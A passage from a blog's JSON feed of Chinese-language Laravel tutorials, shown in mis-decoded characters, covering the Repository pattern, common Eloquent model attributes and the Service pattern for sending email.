Modelï¼Œå°†ç›¸å…³çš„æ•°æ®åº“é€»è¾‘å°è£…åœ¨ä¸åŒçš„ Repositoryï¼Œæ–¹ä¾¿åæœŸé¡¹ç›®çš„ç»´æŠ¤ã€‚ æ•°æ®åº“é€»è¾‘åœ¨ CURD ä¸­ï¼ŒCUR æ¯”è¾ƒç¨³å®šï¼Œä½† Read çš„éƒ¨åˆ†åˆ™å˜åŒ–ä¸‡åƒï¼Œå¤§éƒ¨åˆ†çš„æ•°æ®åº“é€»è¾‘éƒ½åœ¨æè¿° Read éƒ¨åˆ†ï¼Œè‹¥å°†æ•°æ®åº“é€»è¾‘å†™åœ¨ Controller æˆ– Model éƒ½ä¸åˆé€‚ï¼Œä¼šé€ æˆ Controller æˆ– Model ä»£ç è‡ƒè‚¿ï¼Œå¦‚åéš¾ä»¥ç»´æŠ¤ã€‚ Modelä½¿ç”¨ Repository æ¨¡å¼ä¹‹åï¼ŒModel ä»…ä»…å½“æˆ Eloquent Class å³å¯ï¼Œä¸éœ€è¦åŒ…å«æ•°æ®åº“é€»è¾‘ï¼Œä»…ä¿ç•™å¦‚ä¸‹éƒ¨åˆ†ï¼š Propertyï¼š å¦‚ $tableã€$fillable â€¦ Mutatorï¼š åŒ…æ‹¬ mutator ä¸ accessor Methodï¼š relation ç±»çš„æ–¹æ³•ï¼Œæ¯”å¦‚ä½¿ç”¨ hasMany() ä¸ belongsTo() å•ä¸€å¯¹åº”å…³ç³»ï¼š hasOne belongsTo morphTo morphOne å¤šä¸ªå¯¹åº”å…³ç³»æŒ‡çš„æ˜¯ä½¿ç”¨ä»¥ä¸‹å…³é”®è¯å®šä¹‰çš„å…³è”æ¨¡å‹ï¼š hasMany belongsToMany morphMany morphToMany morphedByMany Repositoryåœ¨å¼€å‘æ—¶å¸¸å¸¸ä¼šåœ¨ Controller ç›´æ¥è°ƒç”¨ Model å†™æ•°æ®åº“é€»è¾‘ï¼Œå¦‚ä¸‹ï¼šè·å–æ•°æ®åº“ä¸­ç”¨æˆ· age&gt;20 çš„æ•°æ®ã€‚ 1234public function index()&#123; return User::where('age','&gt;',20)-&gt;orderBy('age')-&gt;get();&#125; è¿™æ ·å†™é€»è¾‘ä¼šæœ‰å‡ ä¸ªé—®é¢˜ï¼š å°†æ•°æ®åº“é€»è¾‘å†™åœ¨ Controllerï¼Œé€ æˆ Controller ä»£ç è‡ƒè‚¿éš¾ä»¥ç»´æŠ¤ã€‚ è¿åäº† SOLID çš„å•ä¸€èŒè´£åŸåˆ™ï¼Œæ•°æ®åº“é€»è¾‘ä¸åº”è¯¥å†™åœ¨ Controller ä¸­ã€‚ Controller ç›´æ¥æ“ä½œ Modelï¼Œä½¿å¾—å¯¹ Controller åšå•å…ƒæµ‹è¯•å›°éš¾ã€‚ æ¯”è¾ƒå¥½çš„æ–¹å¼æ˜¯ä½¿ç”¨ Repositoryï¼š å°† Model ä¾èµ–æ³¨å…¥åˆ° Repositoryã€‚ å°†æ•°æ®åº“é€»è¾‘å†™åœ¨ Repositoryã€‚ å°† Repository ä¾èµ–æ³¨å…¥åˆ° Serviceã€‚ app/Repositories/UserRepostitory.php ä¸­çš„å†…å®¹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpnamespace App\\Repositories;use App\\User;/** * Class UserRepository * @package App\\Repositories */class UserRepository&#123; /** * @var User */ private $user; /** * UserRepository constructor. * @param $user */ public function __construct(User $user) &#123; $this-&gt;user = $user; &#125; /** * @param $age * @return \\Illuminate\\Database\\Eloquent\\Collection|static[] */ public function getAgeLargerThan($age) &#123; return $this-&gt;user -&gt;where('age', '&gt;', $age) -&gt;orderBy('age') -&gt;get(); &#125;&#125; åœ¨æ§åˆ¶å™¨app\\Controllers\\UserController.php ä¸­ä½¿ç”¨ä¾èµ–æ³¨å…¥ï¼š 123456789101112131415161718192021222324252627282930313233343536&lt;?phpnamespace App\\Http\\Controllers;use App\\Repositories\\UserRepository;use Illuminate\\Http\\Request;/** * Class UserController * * @package App\\Http\\Controllers */class UserController extends Controller&#123; /** * @var \\App\\Repositories\\UserRepository */ protected $userRepository; /** * UserController constructor. * @param $userRepository */ public function __construct(UserRepository $userRepository) &#123; $this-&gt;userRepository = $userRepository; &#125; /** * @return \\Illuminate\\Database\\Eloquent\\Collection|static[] */ public function index() &#123; return $this-&gt;userRepository-&gt;getAgeLargerThan(20); &#125;&#125; å°†ç›¸ä¾çš„ UserRepository ä¾è³´æ³¨å…¥åˆ° UserControllerï¼Œå¹¶ä»åŸæœ¬ç›´æ¥ä¾èµ– User Model æ”¹æˆä¾èµ–æ³¨å…¥çš„ UserRepositoryã€‚ ä¼˜ç‚¹ï¼š å°†æ•°æ®åº“é€»è¾‘å†™åœ¨ Repository é‡Œï¼Œè§£å†³äº† Controller ä»£ç è‡ƒè‚¿çš„é—®é¢˜ã€‚ ç¬¦åˆ SOLID çš„å•ä¸€èŒè´£åŸåˆ™ï¼šæ•°æ®åº“é€»è¾‘å†™åœ¨ Repository é‡Œï¼Œæ²¡å†™åœ¨ Controller é‡Œã€‚ ç¬¦åˆ SOLID çš„ä¾èµ–åè½¬åŸåˆ™ï¼šController å¹¶éç›´æ¥ç›¸ä¾ä¸ Repositroyï¼Œè€Œæ˜¯å°† Repository ä¾èµ–æ³¨å…¥è¿› Controllerã€‚ æ³¨æ„âš ï¸ï¼šå®é™…ä¸Šå»ºè®® Repository ä»…ä¾èµ–æ³¨å…¥è¿› Serviceï¼Œè€Œä¸æ˜¯ç›´æ¥æ³¨å…¥åœ¨ Controllerã€‚ å…¶ä»–é—®é¢˜æ˜¯å¦è¯¥å»ºç«‹ Repository Interfaceï¼Ÿç†è®ºä¸Šä½¿ç”¨ä¾èµ–æ³¨å…¥æ—¶ï¼Œåº”è¯¥ä½¿ç”¨ Interface ï¼Œä¸è¿‡ Interface ç›®çš„åœ¨äºæ›´æ¢æ•°æ®åº“ï¼Œè®©ä»£ç è¾¾åˆ°å¼€æ”¾å°é—­çš„è¦æ±‚ï¼Œä½†æ˜¯å®é™…ä¸Šè¦æ›´æ”¹ Reposiroty çš„æœºä¼šä¹Ÿä¸å¤šï¼Œé™¤éæ˜¯ä» MySQL æ›´æ¢åˆ° MongoDBï¼Œæ­¤æ—¶å°±åº”è¯¥å»ºç«‹ Repository Interfaceã€‚ä¸è¿‡ç”±äºæˆ‘ä»¬ä½¿ç”¨äº†ä¾èµ–æ³¨å…¥ï¼Œå°†æ¥è¦ä» Class æ”¹æˆ Interface ä¹Ÿå¾ˆæ–¹ä¾¿ï¼Œåªè¦åœ¨ Constructor çš„ type hint æ”¹æˆ Interface å³å¯ï¼Œç»´æŠ¤æˆæœ¬å¾ˆä½ï¼Œæ‰€ä»¥åœ¨æ­¤å¤§å¯ä½¿ç”¨ Repository Class å³å¯ï¼Œä¸ä¸€å®šå¾—ç”¨Interfaceè€Œé€ æˆ Over Designï¼Œç­‰çœŸæ­£éœ€è¦ä¿®æ”¹æ—¶ï¼Œå†é‡æ„ Interface å³å¯ã€‚ æ˜¯å¦è¯¥ä½¿ç”¨ Query Scope?Laravel 4.2 å°±æœ‰ QueryScopeï¼Œåˆ°åé¢çš„ç‰ˆæœ¬ä¹Ÿéƒ½è¿˜ä¿ç•™ç€ï¼Œå®ƒè®©æˆ‘ä»¬å¯ä»¥å°†é€»è¾‘ä»£ç å†™åœ¨ Model ï¼Œè§£å†³äº†ç»´æŠ¤ä¸é‡å¤ä½¿ç”¨çš„é—®é¢˜ã€‚å¦‚ app/User.php é‡Œçš„ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpnamespace App;use Illuminate\\Notifications\\Notifiable;use Illuminate\\Foundation\\Auth\\User as Authenticatable;/** * App\\User * * @mixin \\Eloquent */class User extends Authenticatable&#123; use Notifiable; /** * The attributes that are mass assignable. * * @var array */ protected $fillable = [ 'name', 'email', 'password', ]; /** * The attributes that should be hidden for arrays. * * @var array */ protected $hidden = [ 'password', 'remember_token', ]; /** * * @param Builder $query * @param integer $age * * @return Builder */ public function scopeGetAgerLargerThan($query, $age) &#123; return $query-&gt;where('age', '&gt;', $age) -&gt;orderBy('age'); &#125;&#125; QueryScope å¿…é¡»ä»¥ scopeå¼€å¤´ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸º queryBuilderï¼Œä¸€å®šè¦åŠ ä¸Šï¼›ç¬¬äºŒä¸ªå‚æ•°ä»¥åä¸ºè‡ªå·±è¦ä¼ å…¥çš„å‚æ•°ã€‚ç”±äºå›ä¼ å¿…é¡»æ˜¯ä¸€ä¸ª queryBuilder ï¼Œå› æ­¤ä¸éœ€è¦åŠ ä¸Š get()ï¼Œåœ¨app/Controllers/UserController.php ä¸­ä½¿ç”¨ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpnamespace App\\Http\\Controllers;use App\\Repositories\\UserRepository;use App\\User;use Illuminate\\Http\\Request;/** * Class UserController * * @package App\\Http\\Controllers */class UserController extends Controller&#123; /** * @var \\App\\Repositories\\UserRepository */ protected $userRepository; /** * UserController constructor. * @param $userRepository */ public function __construct(UserRepository $userRepository) &#123; $this-&gt;userRepository = $userRepository; &#125; /** * @return \\Illuminate\\Database\\Eloquent\\Collection|static[] */ public function index() &#123; return User::getAgerLargerThan(20)-&gt;get(); &#125;&#125; åœ¨ Controller ä¸­ä½¿ç”¨ QueryScope æ—¶ï¼Œä¸éœ€è¦åŠ ä¸Š Prefixï¼Œç”±äºå…¶æœ¬è´¨æ˜¯ queryBuilderï¼Œæ‰€ä»¥è¿˜è¦åŠ ä¸Š get() æ‰èƒ½è·å¾— Conllection æ•°æ®ã€‚ ç”±äº QueryScope æ˜¯å†™åœ¨ Modelï¼Œä¸æ˜¯å†™åœ¨ Controllerï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šè§£å†³äº† Controller è‡ƒè‚¿è¿å SOLID çš„å•ä¸€èŒè´£åŸåˆ™çš„é—®é¢˜ï¼Œ Controller ä¹Ÿå¯ä»¥é‡å¤ä½¿ç”¨ QueryScope ï¼Œå·²ç»æ¯”ç›´æ¥å°†èµ„æ–™åº“é€»è¾‘å†™åœ¨ Controlelr ä¸­å¥½å¾ˆå¤šã€‚ä¸è¿‡è‹¥åœ¨ä¸­å¤§å‹é¡¹ç›®ä¸­ï¼Œä»ç„¶æœ‰ä»¥ä¸‹é—®é¢˜ï¼š Model å·²ç»æœ‰åŸæ¥çš„è´£ä»»ï¼Œè‹¥å†åŠ ä¸Š queryScopeï¼Œé€ æˆ Model è¿‡äºè‡ƒè‚¿éš¾ä»¥ç»´æŠ¤ã€‚ è‹¥æ•°æ®åº“é€»è¾‘å¾ˆå¤šï¼Œå¯èƒ½æ‹†æˆå¤šä¸ª Repositoryï¼Œå¯æ˜¯ç¡®å¾ˆéš¾æ‹†æˆå¤šä¸ª Modelã€‚ å•å…ƒæµ‹è¯•å›°éš¾ï¼Œå¿…é¡»é¢ä¸´ mock Eloquent çš„é—®é¢˜ã€‚ æœ€åå®é™…å¼€å‘æ—¶ï¼Œå¯ä»¥ä¸€å¼€å§‹ 1 ä¸ª Repository å¯¹åº” 1 ä¸ª Modelï¼Œä½†æ˜¯ä¹Ÿä¸å¿…å¤ªè¿‡æ‰§ç€äº 1 ä¸ª Repositoryï¼Œä¸€å®šè¦å¯¹åº” 1 ä¸ª Modelï¼Œå¯å°† Repository è§†ä¸ºé€»è¾‘ä¸Šçš„æ•°æ®åº“é€»è¾‘ç±»åˆ«å³å¯ï¼Œå¯ä»¥æ¨ªè·¨å¤šä¸ªModelå¤„ç†ï¼Œä¹Ÿå¯ä»¥ 1 ä¸ª Model æ‹†æˆå¤šä¸ª Repositoryï¼Œè§†æƒ…å†µè€Œå®šã€‚Repository ä½¿å¾—æ•°æ®åº“é€»è¾‘ä» Controller æˆ– Model ä¸­è§£æ”¾ï¼Œä¸ä»…æ›´å®¹æ˜“ç»´æŠ¤ã€æ›´å®¹æ˜“æ‹“å±•ã€æ›´å®¹æ˜“é‡å¤ä½¿ç”¨ï¼Œä¹Ÿæ›´å®¹æ˜“æµ‹è¯•ã€‚ æ˜¯å¦éœ€è¦ä½¿ç”¨ Repository ï¼Ÿå€’åº•è¯¥ä¸è¯¥ç”¨Repositoryï¼Œå¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œä»æœªåœæ­¢è¿‡è®¨è®ºã€‚æˆ‘è®¤ä¸ºæ²¡æœ‰ç»å¯¹çš„ç”¨æˆ–è€…ä¸ç”¨ï¼Œéœ€è¦æ ¹æ®é¡¹ç›®å®é™…æƒ…å†µè€Œå®šã€‚ ç»“åˆè‡ªå·±çš„ä¸€äº›é¡¹ç›®ç»éªŒï¼Œæˆ‘çš„ç†è§£æ˜¯ï¼šå¯¹äºå°é¡¹ç›®è€Œè¨€ï¼Œå¤æ‚æŸ¥è¯¢å¹¶ä¸å¤šï¼Œç›´æ¥ä½¿ç”¨ORMæ•ˆç‡æ›´é«˜ï¼Œå‰æœŸå¿«é€Ÿå¼€å‘æ‰æ˜¯å…³é”®ï¼Œè¿‡æ—©ä½¿ç”¨Repository åè€Œä¼šé€ æˆè¿‡åº¦è®¾è®¡; è€Œå¯¹äºèµ·æ­¥æœ¬èº«å°±æ˜¯ä¸­å¤§å‹é¡¹ç›®ï¼Œåˆ™å¯ä»¥è€ƒè™‘ä½¿ç”¨Repository å°†å¤æ‚çš„æŸ¥è¯¢å’Œä¸šåŠ¡é€»è¾‘åˆ†å¼€ã€‚ å•ä¸€èŒè´£åŸåˆ™ï¼š Request è´Ÿè´£è¡¨å•éªŒè¯ Model è´Ÿè´£ç»´æŠ¤ORM Controller è´Ÿè´£è·å–è¯·æ±‚å‚æ•° Service è´Ÿè´£å¤„ç†ä¸šåŠ¡é€»è¾‘ Repository è´Ÿè´£ä»æ•°æ®åº“é‡Œå–æ•°æ® è¿™é‡Œæœ‰ä¸¤ä¸ªè®¨è®ºå¾ˆç²¾å½©ï¼šç»ä¸ ä½¿ç”¨ Repository??ã€ç»ä¸ ä½¿ç”¨ Repository?","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Laravel Eloquent å¸¸ç”¨å±æ€§æ•´ç†","slug":"laravel-eloquent-common-attributes-sorting","date":"2021-04-14T15:11:13.000Z","updated":"2021-07-27T00:10:53.755Z","comments":true,"path":"laravel-eloquent-common-attributes-sorting/","link":"","permalink":"https://www.0x2beace.com/laravel-eloquent-common-attributes-sorting/","excerpt":"Eloquent æä¾›äº†å¾ˆå¤šå±æ€§ï¼Œé€šè¿‡å¯¹æ¨¡å‹è¿›è¡Œçº¦å®šï¼Œå¯ä»¥å®ç°å¾ˆå¤šå¾ˆæ–¹ä¾¿çš„åŠŸèƒ½ã€‚","text":"Eloquent æä¾›äº†å¾ˆå¤šå±æ€§ï¼Œé€šè¿‡å¯¹æ¨¡å‹è¿›è¡Œçº¦å®šï¼Œå¯ä»¥å®ç°å¾ˆå¤šå¾ˆæ–¹ä¾¿çš„åŠŸèƒ½ã€‚ connection123456/** * ä¸ºæ¨¡å‹æŒ‡å®šä¸€ä¸ªè¿æ¥åç§° * * @var string */protected $connection = 'connection-name'; table123456/** * ä¸ºæ¨¡å‹æŒ‡å®šä¸€ä¸ªè¡¨å * * @var string */ protected $table = 'users'; primaryKey123456/** * ä¸ºæ¨¡å‹æŒ‡å®šä¸»é”® * * @var string */ protected $primaryKey = 'user_id'; é€šå¸¸ä¸»é”®ä¸æ˜¯idæ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¯¥å±æ€§æŒ‡å®šå±æ€§ã€‚ incrementingEloquent å‡è®¾ä¸»é”®æ˜¯ä¸€ä¸ªè‡ªå¢çš„æ•´æ•°å€¼ï¼Œè¿™æ„å‘³ç€é»˜è®¤æƒ…å†µä¸‹ä¸»é”®ä¼šè‡ªåŠ¨è½¬æ¢ä¸º int ç±»å‹ã€‚ å¦‚æœå¸Œæœ›ä½¿ç”¨éé€’å¢æˆ–éæ•°å­—çš„ä¸»é”®åˆ™éœ€è¦è®¾ç½®å…¬å…±çš„ $incrementing å±æ€§è®¾ç½®ä¸º falseï¼š 123456/** * å¦‚æœä½¿ç”¨çš„æ˜¯éé€’å¢æˆ–è€…éæ•°å­—çš„ä¸»é”® * * @var bool */public $incrementing = false; keyTypeå¦‚æœä½ çš„ä¸»é”®ä¸æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œä½ éœ€è¦å°†æ¨¡å‹ä¸Šå—ä¿æŠ¤çš„ $keyType å±æ€§è®¾ç½®ä¸º stringï¼š 123456/** * è‡ªå®šä¹‰ä¸»é”®ç±»å‹ * * @var string */protected $keyType = 'string'; timestampsé»˜è®¤æƒ…å†µä¸‹ï¼ŒEloquent é¢„æœŸä½ çš„æ•°æ®è¡¨ä¸­å­˜åœ¨created_at å’Œupdated_at å­—æ®µï¼Œå¦‚æœä¸æƒ³è®© Eloquent è‡ªåŠ¨ç®¡ç†è¿™ä¸¤ä¸ªåˆ—ï¼Œ è¯·å°†æ¨¡å‹ä¸­çš„ $timestamps å±æ€§è®¾ç½®ä¸º falseï¼š 123456/** * æ˜¯å¦ä¸»åŠ¨ç»´æŠ¤æ—¶é—´æˆ³ * * @var bool */public $timestamps = false; CREATED_AT|UPDATED_AT123// è‡ªå®šä¹‰å­˜å‚¨æ—¶é—´æˆ³çš„å­—æ®µåconst CREATED_AT = 'start_time';const UPDATED_AT = 'end_time'; dateFormatå¦‚æœéœ€è¦è‡ªå®šä¹‰æ—¶é—´æˆ³çš„æ ¼å¼ï¼Œåœ¨ä½ çš„æ¨¡å‹ä¸­è®¾ç½® $dateFormat å±æ€§ã€‚è¿™ä¸ªå±æ€§å†³å®šæ—¥æœŸå±æ€§åœ¨æ•°æ®åº“çš„å­˜å‚¨æ–¹å¼ï¼Œä»¥åŠæ¨¡å‹åºåˆ—åŒ–ä¸ºæ•°ç»„æˆ–è€… JSON çš„æ ¼å¼ï¼š 123456/** * æ¨¡å‹æ—¥æœŸçš„å­˜å‚¨æ ¼å¼ * * @var string */protected $dateFormat = 'U'; ä¸æ¸…æ¥š U æ˜¯ä»€ä¹ˆæ„æ€çš„ï¼Œè¯·çœ‹ Date/Time å‡½æ•° ã€‚ attributes12345678/** * ä¸ºæ¨¡å‹å±æ€§è®¾ç½®é»˜è®¤å€¼ * * @var array */protected $attributes = [ 'delayed' =&gt; false,]; hidden123456/** * éšè—ä»¥ä¸‹å­—æ®µ * * @var array */protected $hidden = ['password']; visible123456/** * æ˜¾ç¤ºä»¥ä¸‹å­—æ®µ * * @var array */protected $visible = ['first_name', 'last_name']; å¦‚æœè¯´$hidden å±æ€§æ˜¯é»‘åå•ï¼Œé‚£ä¹ˆ$visible å°±æ˜¯ç™½åå•ã€‚ appends12345678/** * * * @var string[] */protected $appends = [ \"type_mean\"]; appends å±æ€§ï¼Œé€šå¸¸ä¼šé…åˆAccessors ä¸€èµ·ä½¿ç”¨ã€‚ fillable123456/** * å¯ä»¥è¢«æ‰¹é‡èµ‹å€¼çš„å±æ€§ * * @var string[] */protected $fillable = [\"username\"]; guarded123456/** * è®¾å®šä¸å¯è¢«æ‰¹é‡èµ‹å€¼çš„å±æ€§ï¼Œå½“ $guarded ä¸ºç©ºæ•°ç»„æ—¶åˆ™æ‰€æœ‰å±æ€§éƒ½å¯ä»¥è¢«æ‰¹é‡èµ‹å€¼ã€‚ * * @var array */protected $guarded = ['price']; castscasts å±æ€§å¾ˆæœ‰ç”¨ï¼Œå¯ä»¥ä½¿å¾—ä»æ•°æ®åº“ä¸­è·å–çš„æ•°æ®ï¼Œå¯ä»¥è‡ªåŠ¨è½¬æ¢æˆæˆ‘ä»¬æœŸæœ›çš„ç±»å‹ã€‚ 1234567891011/** * å­—æ®µè½¬æ¢ä¸ºå¯¹åº”çš„ç±»å‹ * * @var array */protected $casts = [ \"settings\" =&gt; \"array\", 'created_at' =&gt; 'datetime:Y-m-d H:i:s', 'updated_at' =&gt; 'datetime:Y-m-d H:i:s', 'is_admin' =&gt; 'boolean',]; å¯èƒ½çš„å±æ€§è½¬æ¢åˆ—ç±»å‹ï¼š|ç±»å‹|æè¿°||-|-||int|integer|é€šè¿‡ PHP è½¬æ¢ï¼ˆintï¼‰||real|float|double|é€šè¿‡ PHP è½¬æ¢ï¼ˆfloatï¼‰||string|é€šè¿‡ PHP è½¬æ¢ï¼ˆstringï¼‰||bool|boolean|é€šè¿‡ PHP è½¬æ¢ï¼ˆboolï¼‰||object|ä½œä¸ºä¸€ä¸ªstdClass å¯¹è±¡ï¼Œä»JSON è§£ææˆ–è¢«è§£æä¸ºJSON||array|ä½œä¸ºä¸€ä¸ªæ•°ç»„ï¼Œä»JSON è§£ææˆ–è¢«è§£æä¸ºJSON||collection|ä½œä¸ºä¸€ä¸ªé›†åˆï¼Œä»JSON è§£ææˆ–è¢«è§£æä¸ºJSON||date|datetime|ä»æ•°æ®åº“DATATIME è§£æä¸ºCarbon ç±»å‹ï¼Œç„¶åè¿”å›||timestamp|æ•°æ•°æ®åº“TIMESTAMP è§£æä¸ºCarbon ç±»å‹ï¼Œç„¶åè¿”å›| dates123456/** * éœ€è¦è¢«Carbonç»´æŠ¤çš„å­—æ®µå * * @var array */protected $dates = ['deleted_at']; è®¾ç½®dates çš„å±æ€§ï¼Œé»˜è®¤æ˜¯ä¸€ä¸ªCarbon å¯¹è±¡ã€‚ perPage123456&#x2F;** * è‡ªå®šä¹‰æ¯é¡µæ˜¾ç¤ºæ•°é‡ï¼ˆé»˜è®¤ä¸º15æ¡ï¼‰ * * @var int *&#x2F;protected $perPage &#x3D; 50; touches123456/** * æ›´æ–°å…³è”æ¨¡å‹çš„ updated_at å­—æ®µ * * @var array */protected $touches = ['post']; dispatchesEvents123456789/** * æ¨¡å‹çš„äº‹ä»¶æ˜ å°„ * * @var array */protected $dispatchesEvents = [ 'saved' =&gt; UserSaved::class, 'deleted' =&gt; UserDeleted::class,]; withä¸ºå…³è”æ¨¡å‹é»˜è®¤æ·»åŠ ã€æ¸´æ±‚å¼åŠ è½½ã€ï¼Œç­‰æ•ˆäºä½¿ç”¨æŸ¥è¯¢æ„é€ å™¨æ—¶ï¼Œæ‰‹åŠ¨æŒ‡å®šwithã€‚ 123456789101112131415class User &#123; /** * * * @var string[] */ protected $with = [ \"topics\", ]; public function topics() &#123; return $this-&gt;hasMany(Topic::class); &#125;&#125; å‚è€ƒé“¾æ¥ Eloquent ORM å¿«é€Ÿå…¥é—¨","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"ã€è½¬è½½ã€å¦‚ä½•ä½¿ç”¨Service æ¨¡å¼","slug":"how-to-use-service-mode","date":"2021-04-12T15:22:55.000Z","updated":"2021-04-12T15:23:55.459Z","comments":true,"path":"how-to-use-service-mode/","link":"","permalink":"https://www.0x2beace.com/how-to-use-service-mode/","excerpt":"è‹¥å°†æ•°æ®åº“é€»è¾‘éƒ½å†™åœ¨ Controller é‡Œï¼Œä¼šé€ æˆ Controller ä»£ç çš„è‡ƒè‚¿éš¾ä»¥ç»´æŠ¤ï¼ŒåŸºäº SOLID åŸåˆ™ï¼Œæˆ‘ä»¬åº”è¯¥ä½¿ç”¨ Service æ¨¡å¼è¾…åŠ© Controllerï¼Œå°†ç›¸å…³çš„ä¸šåŠ¡é€»è¾‘å°è£…åœ¨ä¸åŒçš„ Serviceï¼Œæ–¹ä¾¿é¡¹ç›®çš„åæœŸç»´æŠ¤ã€‚","text":"è‹¥å°†æ•°æ®åº“é€»è¾‘éƒ½å†™åœ¨ Controller é‡Œï¼Œä¼šé€ æˆ Controller ä»£ç çš„è‡ƒè‚¿éš¾ä»¥ç»´æŠ¤ï¼ŒåŸºäº SOLID åŸåˆ™ï¼Œæˆ‘ä»¬åº”è¯¥ä½¿ç”¨ Service æ¨¡å¼è¾…åŠ© Controllerï¼Œå°†ç›¸å…³çš„ä¸šåŠ¡é€»è¾‘å°è£…åœ¨ä¸åŒçš„ Serviceï¼Œæ–¹ä¾¿é¡¹ç›®çš„åæœŸç»´æŠ¤ã€‚ å•†ä¸šé€»è¾‘å•†ä¸šé€»è¾‘ä¸­ï¼Œå¸¸è§çš„å¦‚ : ç‰µæ¶‰åˆ°å¤–éƒ¨è¡Œä¸º : å¦‚å‘é€Emailï¼Œä½¿ç”¨å¤–éƒ¨APIâ€¦ ä½¿ç”¨PHPå†™çš„é€»è¾‘ : å¦‚æ ¹æ®è´­ä¹°çš„ä»¶æ•°ï¼Œæœ‰ä¸åŒçš„æŠ˜æ‰£ã€‚ è‹¥å°†å•†ä¸šé€»è¾‘å†™åœ¨ controllerï¼Œä¼šé€ æˆ controller è‚¥å¤§ï¼Œæ—¥åéš¾ä»¥ç»´æŠ¤ã€‚ Serviceç‰µæ¶‰åˆ°å¤–éƒ¨çš„è¡Œä¸ºå¦‚ å‘é€Emailï¼Œå¸¸å¸¸ä¼šåœ¨ Controller ä¸­ç›´æ¥è°ƒç”¨ Mail::queue()ï¼š 1234567891011 /** * @param \\Illuminate\\Http\\Request $request */public function store(Request $request)&#123; \\Mail::queue('email.index', $request-&gt;all(), function (Message $message) &#123; $message-&gt;sender(env('MAIL_USERNAME')); $message-&gt;subject(env('MAIL_SUBJECT')); $message-&gt;to(env('MAIL_TO_ADDR')); &#125;);&#125; åœ¨ä¸­å¤§å‹çš„é¡¹ç›®ä¸­ï¼Œä¼šæœ‰å‡ ä¸ªé—®é¢˜ï¼š å°†ç‰µæ¶‰åˆ°å¤–éƒ¨è¡Œä¸ºçš„é€»è¾‘å†™åœ¨ Controllerï¼Œé€ æˆ Controller ä»£ç è‡ƒè‚¿éš¾ä»¥ç»´æŠ¤ è¿å SOLID çš„å•ä¸€èŒè´£åŸåˆ™ï¼šå¤–éƒ¨è¡Œä¸ºä¸åº”è¯¥å†™åœ¨ Controller Controller ç›´æ¥ç›¸ä¾äºå¤–éƒ¨è¡Œä¸ºï¼Œä½¿å¾—æˆ‘ä»¬æ— æ³•å¯¹ Controller åšå•å…ƒæµ‹è¯• æ¯”è¾ƒå¥½çš„æ–¹å¼æ˜¯ä½¿ç”¨ Serviceï¼Œä½¿ç”¨çš„æ­¥éª¤å¦‚ä¸‹ï¼š å°†å¤–éƒ¨è¡Œä¸ºæ³¨å…¥åˆ° Service åœ¨ Service ä½¿ç”¨å¤–éƒ¨è¡Œä¸º å°† Service æ³¨å…¥åˆ° Controlelr app\\Services\\EmailService.phpï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpnamespace App\\Services;use Illuminate\\Mail\\Message;use Mail;/** * Class EmailService * * @package App\\Services */class EmailService&#123; /** * @var \\Mail */ protected $mailer; /** * å°†ç›¸ä¾çš„ Mailer æ³¨å…¥åˆ° EmailService * EmailService constructor. * * @param $mailer */ public function __construct(Mail $mailer) &#123; $this-&gt;mailer = $mailer; &#125; /** * å‘é€ Emailçš„é€»è¾‘å†™åœ¨ send() ä¸æ˜¯ä½¿ç”¨ Mail Facadeï¼Œè€Œæ˜¯ä½¿ç”¨ $this-&gt;mailer * @param array $request */ public function send(array $request) &#123; $this-&gt;mailer-&gt;queue('email.index',$request,function(Message $message)&#123; $message-&gt;sender(env('MAIL_USERNAME')); $message-&gt;subject(env('MAIL_SUBJECT')); $message-&gt;to(env('MAIL_TO_ADDR')); &#125;); &#125;&#125; app\\Controllers\\UserController.phpï¼š 12345678910111213141516171819202122232425262728&lt;?phpnamespace App\\Http\\Controllers;use App\\Services\\EmailService;use Illuminate\\Http\\Request;/** * Class UserController * * @package App\\Http\\Controllers */class UserController extends Controller&#123; /** * @var \\App\\Services\\EmailService */ protected $emailService; /** * @param \\Illuminate\\Http\\Request $request */ public function store(Request $request) &#123; $this-&gt;emailService-&gt;send($request-&gt;all()); &#125;&#125; ä»åŸæœ¬ç›¸ä¾äº Mail Facade ï¼Œæ”¹æˆç›¸ä¾äºæ³¨å…¥çš„ EmailServiceã€‚æ”¹ç”¨è¿™ç§å†™æ³•æœ‰å‡ ä¸ªä¼˜ç‚¹ï¼Œå¦‚ä¸‹ï¼š å°†å¤–éƒ¨è¡Œä¸ºå†™åœ¨ Serviceï¼Œè§£å†³äº† Controller ä»£ç è‡ƒè‚¿çš„é—®é¢˜ã€‚ ç¬¦åˆ SOLID çš„å•ä¸€èŒè´£åŸåˆ™ï¼š å¤–éƒ¨è¡Œä¸ºå†™åœ¨ Service ï¼Œæ²¡å†™åœ¨ Controllerã€‚ ç¬¦åˆ SOLID çš„ä¾èµ–åè½¬åŸåˆ™ï¼šController å¹¶éç›´æ¥ç›¸ä¾äº Serviceï¼Œè€Œæ˜¯å°† Service ä¾èµ–æ³¨å…¥è¿› Controllerã€‚ ä½¿ç”¨ PHP å†™çš„é€»è¾‘å¦‚æ ¹æ®ç”¨æˆ·è´­ä¹°æ•°é‡ï¼Œç»™äºˆåŒæ­¥çš„æŠ˜æ‰£ï¼Œå¯èƒ½æˆ‘ä»¬ä¼šåœ¨ Controller ç›´æ¥å†™ if () { ... } else { ... } é€»è¾‘ã€‚ 